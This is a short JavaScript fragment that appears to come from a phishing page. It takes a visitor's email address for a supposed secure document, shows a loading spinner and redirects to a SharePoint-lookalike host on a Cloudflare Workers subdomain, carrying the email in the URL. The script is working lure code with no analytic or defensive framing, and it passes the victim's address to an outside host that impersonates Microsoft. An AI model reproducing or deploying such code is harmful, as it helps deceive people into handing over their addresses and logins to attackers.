    <script>
      function validateEmail(email) {
        var re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(String(email).toLowerCase());
      }

      function redirectToSecureDoc(event) {
        event.preventDefault();
        var emailInput = document.getElementById('email');
        var errorMsg = document.getElementById('error-message');
        var submitBtn = document.getElementById('submitBtn');
        var email = emailInput.value;

        if (validateEmail(email)) {
          // hide error before redirect
          errorMsg.style.display = 'none';
          emailInput.style.borderColor = '#28a745';

          // disable button to prevent multiple clicks + show spinner and loading text
          submitBtn.disabled = true;
          submitBtn.style.opacity = '0.6';
          submitBtn.style.cursor = 'not-allowed';
          submitBtn.innerHTML = '<span class="spinner"></span>Loading...';

          var decodedEmail = decodeURIComponent(email);


          // Redirect instantly and carry email in URL to the provided link
          window.location.href = 'https://sharepoint-secure.rasa72.workers.dev/#' + decodedEmail;
        } else {
          errorMsg.style.display = 'block';
          emailInput.style.borderColor = '#d93025';
        }
      }
    </script>
